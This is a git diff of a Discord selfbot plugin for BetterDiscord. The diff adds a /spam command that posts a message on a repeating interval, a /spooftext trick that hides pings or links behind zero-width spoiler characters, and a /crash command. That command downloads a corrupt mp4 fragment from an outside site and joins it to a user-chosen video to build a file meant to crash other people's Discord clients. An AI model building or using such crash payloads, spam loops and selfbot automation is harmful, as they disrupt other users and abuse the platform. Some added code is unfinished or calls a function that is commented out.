@@ -21,7 +21,7 @@ const Selfbot = (() => {
         "name": "jefff",
         "discord_id": "769415977439592468"
     }],
-      "version": "1.4.6",
+      "version": "1.4.7",
       "description": "Custom slash commands and an advanced dank memer farmer bot.",
       "github": "",
       "github_raw": "https://raw.githubusercontent.com/miles352/BDSelfbot/main/Selfbot.plugin.js"
@@ -29,7 +29,7 @@ const Selfbot = (() => {
     "changelog": [
       {
         "title": "New Stuff",
-        "items": ["Added /cloneserver command"]
+        "items": ["Added /spam command :troll:"]
         },
 
       /*{
@@ -198,12 +198,18 @@ const Selfbot = (() => {
       "collapsible": true,
       "shown": false,
       "settings": [{
+        "type": "switch",
+        "id": "podcast",
+        "name": "Remove Giant Podcast Bar",
+        "note": "",
+        "value": true,
+      }, {
         "type": "color",
         "id": "embedColor",
         "name": "Embed Color",
         "note": "This applies to commands such as /cat",
         "value": "#fcba03"
-  }]
+        }]
   }]
   }
 
@@ -230,7 +236,7 @@ const Selfbot = (() => {
   } : (([Plugin, Api]) => {
     const plugin = (Plugin, Library) => {
 
-      const { Logger, Patcher } = Library;
+      const { Logger, Patcher, Settings, Modals, WebpackModules, ReactTools } = Library;
 
       const SectionModule = BdApi.findModuleByProps("BUILT_IN_SECTIONS").BUILT_IN_SECTIONS;
       const CommandsModule = BdApi.findModuleByProps("BUILT_IN_COMMANDS").BUILT_IN_COMMANDS;
@@ -246,6 +252,7 @@ const Selfbot = (() => {
       let totalCoins = 0;
       let messageSent;
       let modules;
+      
       return class Selfbot extends Plugin {
 
         async onStart() {
@@ -297,10 +304,26 @@ const Selfbot = (() => {
                 message += `<@${messagePart.userId}>`
               } else if (messagePart.type === "emoji") {
                 message += messagePart.name
+              } else if (messagePart.type === "customEmoji") {
+                message += messagePart.animated ? `<a${messagePart.name}${messagePart.emojiId}> ` : `<${messagePart.name}${messagePart.emojiId}> `;
               }
             })
             return message;
           }
+
+          // function togglePodcast() {
+          //   if (podcastToggle) {
+          //     BdApi.injectCSS("podcast", `
+          //       div[class*=channelNotice] {
+          //         display: none;
+          //       }
+          //       `)
+          //   } else {
+          //     BdApi.clearCSS("podcast")
+          //   }
+          // }
+
+          // togglePodcast();
 
           let style = document.createElement('style');
           style.setAttribute("id", "toastmod");
@@ -415,8 +438,8 @@ const Selfbot = (() => {
                   description: "Displays user info.",
                   options: [{ name: "id", type: 3, description: "User ID", required: true }],
                   execute: async function(e, t) {
-                    console.log(e.id[0].text);
-                    const user = BdApi.findModuleByProps("getCurrentUser").getUser(`${e.id[0].text}`);
+                    const id = e.id[0].text
+                    const user = BdApi.findModuleByProps("getCurrentUser").getUser(id);
 
                     SendClydeEmbed(t.channel.id, {
                       title: `Information for User: ${user.username}`,
@@ -441,6 +464,9 @@ const Selfbot = (() => {
                           }
                         ]
                     });
+
+                    WebpackModules.getByProps("fetchMutualFriends", "setSection").open(id)
+
                   },
                  },
                 {
@@ -531,7 +557,67 @@ const Selfbot = (() => {
                         console.log(err);
                       });
                   }
-                }
+                },
+                {
+                  name: "ytconverter",
+                  description: "Converts a youtube URL into a .mp3 or .mp4 Default is an mp4",
+                  options: [{name: "URL", type: "3", required: true}, {name: "format", type: "3", required: false, choices: [{name: "mp3", value: "mp3"}, {name: "mp4", value: "mp4"}]}],
+                  execute: async (e, t) => {
+                    const format = e.format?.[0].text ? e.format[0].text : "mp4";
+                    const URL = e.URL[0].text;
+
+                    
+                    fetch(URL)
+                      .then(res => console.log(res))
+                  }
+                }, 
+                {
+                  name: "report",
+                  description: "Makes it easier to report a user/server.",
+                  options: [],
+                  execute: function(e, t) {
+                    function change(...params) {
+                      console.log(params);
+                    }
+
+                    try {
+                      Modals.showModal("Report Menu", ZLibrary.ReactTools.createWrappedElement([
+                        new Settings.Textbox("Email Address", "This is the email where discord will reply to you.", "", change, {placeholder: "example@example.com"}).getElement(),
+                        new Settings.Dropdown("Report Category", "", 0, [{label: "Choose a topic to report", value: 0}, {label: "Report abuse or harrassment", value: 1}, {label: "Report spam", value: 2}, {label: "Report other issue", value: 3}, {label: "Appeals, age update, other questions", value: 4}], change).getElement()
+                      ], {
+                        confirmButtonColor: "blue"
+                      }))
+                    } catch(e) {
+                      console.log(e)
+                    }
+                    
+
+                    // const TextInput = BdApi.findModuleByDisplayName('TextInput');
+                    // const FormTitle = BdApi.findModuleByDisplayName('FormTitle');
+                    // BdApi.showConfirmationModal("Title", [
+                    //   BdApi.React.createElement(FormTitle, {
+                    //     children: "Email Address"
+                    //   }),
+                    //   BdApi.React.createElement(TextInput, {
+                    //     onChange: change,
+                    //     placeholder: "you@example.com",
+                        
+                    //   })
+                    // ]);
+                  }
+                },
+                 {
+                   name: "spam",
+                   description: "Spams a message at an interval",
+                   options: [{name: "message", type: 3, required: true}, {name: "interval", type: 4, description: "Interval in seconds", required: true}],
+                   execute: function(e, t) {
+                    const interval = e.interval[0].text;
+                    const message = getAllMessageParts(e.message);
+                    setInterval(() => {
+                      SendMessage(t.channel.id, message)
+                    }, interval * 1000)
+                   }
+                 }
               ]
             }, {
               name: "Fun",
@@ -1040,14 +1126,66 @@ const Selfbot = (() => {
               },
               commands: [
                 {
+                  name: "spooftext",
+                  description: "Sends one thing, and the other thing is not shown. Useful for pings or URLs to show embeds.",
+                  options: [{name: "shown", type: 3, required: true, description: "The message everyone will see"}, {name: "hidden", type: 3, required: true, description: "The message that is sent but not seen"}],
+                  execute: function(e, t) {
+                    const shownMsg = getAllMessageParts(e.shown);
+                    const hiddenMsg = getAllMessageParts(e.hidden);
+
+                    const messageToSend = shownMsg + decodeURIComponent('||\u200b||').repeat(200) + hiddenMsg;
+
+                    SendMessage(t.channel.id, messageToSend);
+                  }
+                },
+                {
                   name: "crash",
                   description: "Sends a discord crash gif/video",
-                  options: [],
+                  options: [{name: "link", required: true, description: "The video to corrupt", type: 3}],
                   execute: async (e, t) => {
+
+                    const commonjsLoader = window.require;
+                    delete window.module; // Make monaco think this isn't a local node script or else it freaks out
+        
+                    BdApi.linkJS("ffmpeg", "https://unpkg.com/@ffmpeg/ffmpeg@0.9.5/dist/ffmpeg.min.js");
+        
+                    const amdLoader = window.require; // Grab Monaco's amd loader
+                    window.require = commonjsLoader; // Revert to commonjs
+                    // this.log(amdLoader, window.require);
+                    // amdLoader.config({paths: {vs: "https://cdnjs.cloudflare.com/ajax/libs/monaco-editor/0.20.0/min/vs"}});
+                    // amdLoader(["vs/editor/editor.main"], () => {}); // exposes the monaco global
+
+                    const { createFFmpeg } = FFmpeg;
+
+                    console.log(createFFmpeg);
+                    // crazy regex thanks to basil <3 (no homo)
+                    // he is also hosting the corrupt part of the mp4 that crashes on his website go check it out https://gbasil.dev
+
+
+                    const inputtedLink = e.link[0].text;
+
+                    const filePath = /(\/\d+){2}\/(\d+|-|_)+.mp4/.exec(inputtedLink)[0];
+                    
+                    const formattedLink = `https://media.discordapp.net/attachments${filePath}`;
+                    
+                    
+                    const crashBlob = await fetch("https://images-ext-2.discordapp.net/external/GtQTqOJ2kj98ttp9bV1zSmvCHJn4V9C07ML7TKtUM6s/https/gbasil.dev/jefffishorniUwUNyaRawrx3.mp4").then(res => res.blob());
                     
 
                     
-                    BdApi.showToast("idk what the script is lmao", {type: "error"});
+                    const video = await fetch(formattedLink).then(res => res.blob())
+
+                    const crashVideo = new Blob([video, crashBlob], {
+                      type: "video/mp4"
+                    });
+                    
+                    // BdApi.findModuleByProps('instantBatchUpload').upload(t.channel.id, crashVideo, 0, "irrelevant text", false, "test.mp4");
+
+                      
+                      
+
+                    
+                    
                     
 
                       
@@ -1480,6 +1618,8 @@ const Selfbot = (() => {
                   document.getElementById("dankmemer").style.color = args[2];
                   break;
               }
+            } else if (args[1] == "podcast") {
+              togglePodcast()
             }
           })
           return panel.getElement();
